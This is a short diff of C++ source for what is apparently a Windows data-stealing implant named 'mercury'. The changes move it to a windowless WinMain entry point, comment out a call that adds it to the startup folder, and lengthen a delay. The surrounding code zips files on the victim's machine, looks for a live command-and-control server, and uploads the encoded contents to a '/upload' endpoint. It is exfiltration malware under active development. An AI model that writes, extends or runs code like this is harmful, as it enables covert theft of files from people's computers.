@@ -62,7 +62,7 @@ void GenZip() {
 }
 
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     std::wstring uid;
     std::string pubDir = PublicDir();
     std::string zipFile = pubDir + "zipped.zip";
@@ -72,7 +72,7 @@ int main() {
     if (ONETIMERUN) {
         // If the zip file doesn't exist, it's the first run
         if (!std::filesystem::exists(zipFile)) {
-            PersistOnMachine(); // Add mercury to startup folder
+            //PersistOnMachine(); // Add mercury to startup folder
             GenZip();           // Process files and create a zip file
 
             // Try connecting to Google and then connect to all C2 URLs to find a live C2
@@ -135,7 +135,7 @@ int main() {
                 std::wstring FileUploadURL = C2 + L"/upload";
                 std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
                 std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-                Sleep(1000);
+                Sleep(2000);
             }
             
 
